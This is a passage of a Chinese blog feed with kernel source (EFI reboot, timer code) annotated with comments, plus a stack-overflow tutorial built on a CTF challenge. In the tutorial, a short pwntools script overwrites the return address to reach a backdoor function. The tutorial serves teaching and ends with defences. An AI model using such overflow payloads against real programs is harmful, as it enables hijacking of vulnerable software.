class="hljs-string">&quot;cold&quot;</span>, <span class="hljs-string">&quot;warm&quot;</span>, <span class="hljs-string">&quot;shutdown&quot;</span>, <span class="hljs-string">&quot;platform&quot;</span> &#125;;<br><span class="hljs-type">int</span> efi_mode, cap_reset_mode;<br><br>    <span class="hljs-comment">//检查系统是否启用了 EFI 运行时服务，如果没有，它会立即返回</span><br><span class="hljs-keyword">if</span> (!efi_enabled(EFI_RUNTIME_SERVICES))<br><span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">//reboot_mode，指定要执行的重启类型（冷、热）</span><br>    <span class="hljs-comment">//热启动没有关闭电源；启动过程的区别是，冷启动需要进行硬件的自检，而热启动跳过硬件自检这一步。 </span><br><span class="hljs-keyword">switch</span> (reboot_mode) &#123;<br><span class="hljs-keyword">case</span> REBOOT_WARM:<br><span class="hljs-keyword">case</span> REBOOT_SOFT:<br>efi_mode = EFI_RESET_WARM;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>efi_mode = EFI_RESET_COLD;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If a quirk forced an EFI reset mode, always use that.</span><br><span class="hljs-comment"> */</span><br>    <br>    <span class="hljs-comment">//如果 capsule 更新挂起，该函数检查请求的重置模式是否与挂起的 capsule 更新所需的重置模式兼容，如果不兼容，它会打印一条警告消息并相应地调整重置模式。</span><br><span class="hljs-keyword">if</span> (efi_reboot_quirk_mode != <span class="hljs-number">-1</span>)<br>efi_mode = efi_reboot_quirk_mode;<br><br><span class="hljs-keyword">if</span> (efi_capsule_pending(&amp;cap_reset_mode)) &#123;<br><span class="hljs-keyword">if</span> (efi_mode != cap_reset_mode)<br>printk(KERN_CRIT <span class="hljs-string">&quot;efi: %s reset requested but pending &quot;</span><br>       <span class="hljs-string">&quot;capsule update requires %s reset... Performing &quot;</span><br>       <span class="hljs-string">&quot;%s reset.\n&quot;</span>, str[efi_mode], str[cap_reset_mode],<br>       str[cap_reset_mode]);<br>efi_mode = cap_reset_mode;<br>&#125;<br><span class="hljs-comment">//调用 EFI reset_system() 函数来启动重启。 reset_system() 函数是 EFI 运行时服务的一部分，由系统固件实现。</span><br>efi.reset_system(efi_mode, EFI_SUCCESS, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="machine-real-restart"><a href="#machine-real-restart" class="headerlink" title="machine_real_restart()"></a>machine_real_restart()</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//BIOS引导重启</span><br><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">machine_real_restart</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> type)</span><br>&#123;<br>    <span class="hljs-comment">//禁用中断</span><br>local_irq_disable();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Write zero to CMOS register number 0x0f, which the BIOS POST</span><br><span class="hljs-comment"> * routine will recognize as telling it to do a proper reboot.  (Well</span><br><span class="hljs-comment"> * that&#x27;s what this book in front of me says -- it may only apply to</span><br><span class="hljs-comment"> * the Phoenix BIOS though, it&#x27;s not clear).  At the same time,</span><br><span class="hljs-comment"> * disable NMIs by setting the top bit in the CMOS address register,</span><br><span class="hljs-comment"> * as we&#x27;re about to do peculiar things to the CPU.  I&#x27;m not sure if</span><br><span class="hljs-comment"> * `outb_p&#x27; is needed instead of just `outb&#x27;.  Use it to be on the</span><br><span class="hljs-comment"> * safe side.  (Yes, CMOS_WRITE does outb_p&#x27;s. -  Paul G.)</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//将0x00值写入 CMOS 寄存器。 BIOS POST（开机自检）例程使用此值来确定是否应执行正确的重新引导。通过设置 CMOS 地址寄存器的最高位来禁用 NMI（不可屏蔽中断）</span><br>spin_lock(&amp;rtc_lock);<span class="hljs-comment">//锁</span><br>CMOS_WRITE(<span class="hljs-number">0x00</span>, <span class="hljs-number">0x8f</span>);<br>spin_unlock(&amp;rtc_lock);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Switch to the trampoline page table.</span><br><span class="hljs-comment"> */</span><br>    <br>load_trampoline_pgtable();<br><span class="hljs-comment">//跳转到执行实际系统重启的低内存代码。</span><br>    <span class="hljs-comment">//代码位于 real_mode_header-&gt;machine_real_restart_asm 地址，并传递指定要执行的重启类型的类型参数。</span><br><span class="hljs-comment">/* Jump to the identity-mapped low memory code */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_32</span><br><span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;jmpl *%0&quot;</span> : :</span><br><span class="hljs-params">     <span class="hljs-string">&quot;rm&quot;</span> (real_mode_header-&gt;machine_real_restart_asm),</span><br><span class="hljs-params">     <span class="hljs-string">&quot;a&quot;</span> (type))</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;ljmpl *%0&quot;</span> : :</span><br><span class="hljs-params">     <span class="hljs-string">&quot;m&quot;</span> (real_mode_header-&gt;machine_real_restart_asm),</span><br><span class="hljs-params">     <span class="hljs-string">&quot;D&quot;</span> (type))</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">//调用无法访问的函数来标记函数的结束，因为代码不应从重启中返回。因此没有return</span><br>unreachable();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="timer-list"><a href="#timer-list" class="headerlink" title="timer_list"></a>timer_list</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_list</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * All fields that change during normal runtime grouped to the</span><br><span class="hljs-comment"> * same cacheline</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span><span class="hljs-title">entry</span>;</span><span class="hljs-comment">//struct hlist_node 字段，允许将计时器插入哈希列表</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>expires;<span class="hljs-comment">//存储了定时器应该到期的时间</span><br><span class="hljs-type">void</span>(*function)(<span class="hljs-keyword">struct</span> timer_list *);<span class="hljs-comment">//指向定时器到期时应该调用的函数的函数指针</span><br>u32flags;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">IMER_CPUMASK：这个标志表示定时器应该只在一组特定的 CPU 上运行，如定时器的 cpumask 字段中指定的那样。</span><br><span class="hljs-comment">TIMER_PINNED：这个标志表示定时器被固定到一个特定的 CPU，即使当前 CPU 空闲也不应该迁移到另一个 CPU。</span><br><span class="hljs-comment">TIMER_IRQSAFE：该标志表示可以从中断上下文安全地调用定时器函数。</span><br><span class="hljs-comment">TIMER_ONESHOT：这个标志表示定时器应该只运行一次然后从定时器列表中删除。</span><br><span class="hljs-comment">TIMER_STOP：此标志用于停止计时器并防止其运行。</span><br><span class="hljs-comment">*/</span><br>    <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_LOCKDEP</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lockdep_map</span><span class="hljs-title">lockdep_map</span>;</span><span class="hljs-comment">//如果启用CONFIG_LOCKDEP 选项，用于锁调试</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="timer-setup宏"><a href="#timer-setup宏" class="headerlink" title="timer_setup宏"></a>timer_setup宏</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> timer_setup(timer, callback, flags)\</span><br><span class="hljs-meta">__init_timer((timer), (callback), (flags))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __init_timer(_timer, _fn, _flags)\</span><br><span class="hljs-meta">init_timer_key((_timer), (_fn), (_flags), NULL, NULL)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_timer_key</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> timer_list *timer,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> (*func)(<span class="hljs-keyword">struct</span> timer_list *), <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-keyword">struct</span> lock_class_key *key)</span><br>&#123;<br>    <br>debug_init(timer);<span class="hljs-comment">//给定定时器初始化调试</span><br>do_init_timer(timer, func, flags, name, key);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_init_timer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> timer_list *timer,</span><br><span class="hljs-params">  <span class="hljs-type">void</span> (*func)(<span class="hljs-keyword">struct</span> timer_list *),</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-keyword">struct</span> lock_class_key *key)</span><br>&#123;<br>timer-&gt;entry.pprev = <span class="hljs-literal">NULL</span>;<br>timer-&gt;function = func;<br>timer-&gt;flags = flags | raw_smp_processor_id();<br>lockdep_init_map(&amp;timer-&gt;lockdep_map, name, key, <span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="add-timer"><a href="#add-timer" class="headerlink" title="add_timer()"></a>add_timer()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">add_timer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> timer_list *timer)</span><br>&#123;<br>    <span class="hljs-comment">////如果传递给 BUG_ON 的条件为真，内核将打印一条错误消息并停止系统。</span><br>BUG_ON(timer_pending(timer));<br>mod_timer(timer, timer-&gt;expires);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mod_timer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> timer_list *timer, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> expires)</span><br>&#123;<br><span class="hljs-keyword">return</span> __mod_timer(timer, expires, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-comment">//修改定时器的到期时间和行为</span><br>__mod_timer(<span class="hljs-keyword">struct</span> timer_list *timer, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> expires, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> options)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_base</span> *<span class="hljs-title">base</span>, *<span class="hljs-title">new_base</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = UINT_MAX;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> clk = <span class="hljs-number">0</span>, flags;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//函数错误BUG</span><br>BUG_ON(!timer-&gt;function);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This is a common optimization triggered by the networking code - if</span><br><span class="hljs-comment"> * the timer is re-modified to have the same timeout or ends up in the</span><br><span class="hljs-comment"> * same array bucket then just return:</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//检查计时器是否已挂起，如果是，则检查新的到期时间是否与旧的相同。如果选项标志 MOD_TIMER_REDUCE 被设置并且新的到期时间早于旧的，函数也返回。</span><br><span class="hljs-keyword">if</span> (timer_pending(timer)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The downside of this optimization is that it can result in</span><br><span class="hljs-comment"> * larger granularity than you would get from adding a new</span><br><span class="hljs-comment"> * timer with this expiry.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> diff = timer-&gt;expires - expires;<br><br><span class="hljs-keyword">if</span> (!diff)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (options &amp; MOD_TIMER_REDUCE &amp;&amp; diff &lt;= <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We lock timer base and calculate the bucket index right</span><br><span class="hljs-comment"> * here. If the timer ends up in the same bucket, then we</span><br><span class="hljs-comment"> * just update the expiry time and avoid the whole</span><br><span class="hljs-comment"> * dequeue/enqueue dance.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">//检查计时器当前是否处于挂起状态，如果定时器已经挂起，函数会检查它是否已经在正确的base中。如果是，则在未设置 MOD_TIMER_REDUCE 标志的情况下更新到期时间并返回。</span><br>base = lock_timer_base(timer, &amp;flags);<br>forward_timer_base(base);<br><br>        <span class="hljs-comment">//检查计时器的到期时间是否小于或等于新的到期时间。如果是这种情况，它将返回值设置为 1 并跳转到标签 out_unlock。</span><br><span class="hljs-keyword">if</span> (timer_pending(timer) &amp;&amp; (options &amp; MOD_TIMER_REDUCE) &amp;&amp;<br>    time_before_eq(timer-&gt;expires, expires)) &#123;<br>ret = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">goto</span> out_unlock;<br>&#125;<br><br>        <span class="hljs-comment">//更新clock和索引，clk和idx用于确定将定时器放置在定时器轮数据结构中的位置。</span><br>clk = base-&gt;clk;<br>idx = calc_wheel_index(expires, clk);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Retrieve and compare the array index of the pending</span><br><span class="hljs-comment"> * timer. If it matches set the expiry to the new value so a</span><br><span class="hljs-comment"> * subsequent call will exit in the expires check above.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">//检查计时器的索引是否与为计时器的新到期时间计算的索引相同。如果是，直接更新计时器时间</span><br><span class="hljs-keyword">if</span> (idx == timer_get_idx(timer)) &#123;<br><span class="hljs-keyword">if</span> (!(options &amp; MOD_TIMER_REDUCE))<br>timer-&gt;expires = expires;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (time_after(timer-&gt;expires, expires))<br>timer-&gt;expires = expires;<br>ret = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">goto</span> out_unlock;<span class="hljs-comment">//跳转到释放定时器基锁的函数末尾</span><br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>base = lock_timer_base(timer, &amp;flags);<br>forward_timer_base(base);<br>&#125;<br><br>ret = detach_if_pending(timer, base, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!ret &amp;&amp; (options &amp; MOD_TIMER_PENDING_ONLY))<br><span class="hljs-keyword">goto</span> out_unlock;<br><br>new_base = get_target_base(base, timer-&gt;flags);<br><br><span class="hljs-keyword">if</span> (base != new_base) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We are trying to schedule the timer on the new base.</span><br><span class="hljs-comment"> * However we can&#x27;t change timer&#x27;s base while it is running,</span><br><span class="hljs-comment"> * otherwise del_timer_sync() can&#x27;t detect that the timer&#x27;s</span><br><span class="hljs-comment"> * handler yet has not finished. This also guarantees that the</span><br><span class="hljs-comment"> * timer is serialized wrt itself.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">//在新的base上建立计时器</span><br>        <span class="hljs-comment">//如果计时器当前未运行，则代码会在计时器的标志字段中设置 TIMER_MIGRATING 标志，以指示计时器正在被移动到新的base。</span><br><span class="hljs-keyword">if</span> (likely(base-&gt;running_timer != timer)) &#123;<br><span class="hljs-comment">/* See the comment in lock_timer_base() */</span><br>timer-&gt;flags |= TIMER_MIGRATING;<br><br>            <span class="hljs-comment">//解锁当前基地，锁定新基地，并更新计时器的标志字段以反映它属于新base。</span><br>raw_spin_unlock(&amp;base-&gt;lock);<br>base = new_base;<br>raw_spin_lock(&amp;base-&gt;lock);<br>WRITE_ONCE(timer-&gt;flags,<br>   (timer-&gt;flags &amp; ~TIMER_BASEMASK) | base-&gt;cpu);<br>forward_timer_base(base);<br>&#125;<br>&#125;<br><br>debug_timer_activate(timer);<br><br>timer-&gt;expires = expires;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If &#x27;idx&#x27; was calculated above and the base time did not advance</span><br><span class="hljs-comment"> * between calculating &#x27;idx&#x27; and possibly switching the base, only</span><br><span class="hljs-comment"> * enqueue_timer() and trigger_dyntick_cpu() is required. Otherwise</span><br><span class="hljs-comment"> * we need to (re)calculate the wheel index via</span><br><span class="hljs-comment"> * internal_add_timer().</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//如果基准时间没有提前，则可以在计算出的索引处将计时器添加到计时器轮，而无需重新计算它。</span><br><span class="hljs-keyword">if</span> (idx != UINT_MAX &amp;&amp; clk == base-&gt;clk) &#123;<br>enqueue_timer(base, timer, idx);<br>trigger_dyntick_cpu(base, timer);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>internal_add_timer(base, timer);<span class="hljs-comment">//internal_add_timer()重新计算idx</span><br>&#125;<br><br>out_unlock:<br>raw_spin_unlock_irqrestore(&amp;base-&gt;lock, flags);<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>命令行使用相关</title>
    <link href="/2022/08/25/%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/08/25/%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<p>命令行配置文件</p><p>notepad $profile</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>StackOverflow</title>
    <link href="/2022/07/09/StackOverflow/"/>
    <url>/2022/07/09/StackOverflow/</url>
    
    <content type="html"><![CDATA[<p>​前段时间给CWL写了一个简单推文，存一下。</p><h1 id="Stack-Overflow—栈溢出"><a href="#Stack-Overflow—栈溢出" class="headerlink" title="Stack Overflow—栈溢出"></a>Stack Overflow—栈溢出</h1><p>​你听说过栈溢出吗？如果没有，或许你在编程入门时一定遇到过段错误（Segment Fault），栈溢出是程序漏洞的入门级漏洞，编程初学者很容易在使用c、c++误用带有栈溢出漏洞的函数、进而造成错误的内存访问，这是出现段错误的其中一个原因。</p><p>​栈是一种先进后出（LIFO）的数据结构，其在程序函数调用过程和程序运行过程中广泛应用，每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。下面将以linux下x86系统为例，分析栈溢出的成因。</p><p>​在学习栈溢出前，我们需要了解一下函数调用栈的相关知识。</p><p>​在C语言程序中，函数调用经常是嵌套的，但机器寄存器的数量是有限的，假设我们在函数A中调用函数B，我们需要将A的参数信息保存下来，从而使程序执行函数B的代码，这个保存的方式就是栈帧：在同一个时间，每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)，栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</p><p><img src="/2022/07/09/StackOverflow/1.png"></p><p>​当程序调用一个新函数时，会建立一个栈帧，依次进行以下步骤：将寄存器数据压入栈中→将函数参数压入栈中→将该函数结束的下一条语句的地址压入栈中(返回地址)→将原函数的栈帧基址压入栈中→进行函数本身的栈利用操作</p><p>​当该新函数运行结束时，会依次弹出该栈帧的数据，通过EBP将栈基址恢复为上一层函数的栈基址，程序再跳到返回地址指向的代码处继续运行。</p><p>​在此过程中，最关键的部分在于【返回地址】，如果我们使用某些操作将返回地址修改掉，那么在函数结束返回原函数时会失败，进而跳转到被修改的地址上，这就属于其中一种最入门的栈溢出漏洞。</p><p>​那么栈溢出漏洞利用的原理就很明显了：利用栈中数据的溢出篡改程序进程，进而劫持程序或破坏程序。</p><p>​接下来将以一个基础例子(Buuctf—jarvisoj_level0)来描述利用read函数的劫持过程。</p><p>​read函数说明：read(int fd, void * buf, size_t count)会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数count 为0, 则read()不会有作用并返回0. </p><p>​若该程序定义的输入字节数大于buf指向的内存空间，程序也将照样执行，我们将可以借此修改栈帧中的返回地址。</p><p>​使用反汇编程序ida查看题目所给的可执行文件</p><p>​main函数：</p><p><img src="/2022/07/09/StackOverflow/2.png"></p><p>​进入vulnerable_function()</p><p><img src="/2022/07/09/StackOverflow/3.png"></p><p>​发现存在read函数，buf长度128，却能读入0x200个字节，我们回顾一下栈帧的压入过程</p><p><img src="/2022/07/09/StackOverflow/4.png" alt="image-20220521235503738"></p><p>​由于栈是由高地址向低地址生长，当往buf中存入0x200字节内容时，溢出的内容会覆盖至后面的返回地址上，因此我们可以借此修改返回地址，实现改变程序结束该函数后运行的代码地址。</p><p>​继续查看反汇编代码，发现有一个后门函数（可直接劫持程序的函数，往往叫systemcall，后门函数常出现于安全类赛事中，用于程序漏洞利用的考察）</p><p><img src="/2022/07/09/StackOverflow/5.png" alt="image-20220521235743316"></p><p>​查看该后门函数的地址并记录</p><p><img src="/2022/07/09/StackOverflow/6.png" alt="image-20220521235926677"></p><p>​因此，我们现在需要做的事情就非常明确了：输入大于128字节的数据，覆盖栈中存储返回地址的空间，修改为我们需要程序运行的函数的地址，此处为0x400596，使程序在read函数结束后跳转到后门函数中，实现程序劫持。</p><p>​使用python写一个小的脚本实现</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">from pwn import *<br>sh=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,***)<span class="hljs-regexp">//</span>连接题库<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">136</span>+p64(<span class="hljs-number">0</span>x400596)<span class="hljs-regexp">//</span>输入<span class="hljs-number">128</span>+<span class="hljs-number">8</span>个无用数据覆盖前面的空间，再存入后门函数的地址<br>sh.send(payload)<span class="hljs-regexp">//</span>发送数据<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>​这只是体现栈溢出原理的一个很基础的例子，常用的存在该类型溢出的函数还有gets()等，实际利用中，常常搭配ROP链(利用程序中已有的汇编代码片段进行组合成为攻击代码链，以此劫持程序)、shellocode(往可执行栈堆中注入攻击代码，利用栈溢出跳转执行攻击代码实现劫持)等实现程序劫持，若想更深入地了解，可以访问ctf wiki进行进一步的学习。</p><p>​关于栈溢出的防范，还有一些应对栈溢出的方法，如NX栈堆不可执行保护(防范shellcode)、canary(在栈中使用标志位，通过标记数字是否被篡改判断是否产生栈溢出)、ASLR地址随机化(使攻击者无法直接注入静态地址)，但这些方式都可以通过一定的方式进行绕过，因此最有效的方法即慎用甚至不用危险函数。</p><p>​</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用patchelf修改程序依赖的libc库</title>
    <link href="/2021/09/27/%E4%BD%BF%E7%94%A8patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E5%BA%93/"/>
    <url>/2021/09/27/%E4%BD%BF%E7%94%A8patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E5%BA%93/</url>
    
